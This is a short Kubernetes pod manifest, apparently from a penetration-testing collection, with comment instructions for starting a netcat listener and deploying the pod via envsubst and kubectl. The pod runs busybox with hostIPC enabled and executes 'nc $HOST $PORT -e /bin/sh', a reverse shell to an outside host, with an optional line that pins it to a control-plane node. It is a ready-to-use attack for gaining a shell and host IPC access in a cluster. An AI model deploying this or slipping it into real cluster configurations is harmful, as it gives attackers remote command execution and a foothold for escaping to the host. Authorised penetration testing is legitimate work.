###########################################################
## Set up Listener: nc -nvlp 3116
## Deploy: HOST="10.0.0.1" PORT="3116" envsubst < hostipc-revshell-pod.yaml | kubectl apply -f -
## Remove: kubectl -n [namespace] delete hostipc-revshell-pod
###########################################################
apiVersion: v1
kind: Pod
metadata:
  name: hostipc-revshell-pod
  labels:
    app: pentest
spec:
  hostIPC: true
  containers:
  - image: busybox
    command: [ "/bin/sh", "-c", "--" ]
    args: [ "nc $HOST $PORT  -e /bin/sh;" ]
    name: hostipc-revshell-pod
  restartPolicy: Always
  #nodeName: k8s-control-plane-node # Force your pod to run on the control-plane node by uncommenting this line and changing to a control-plane node name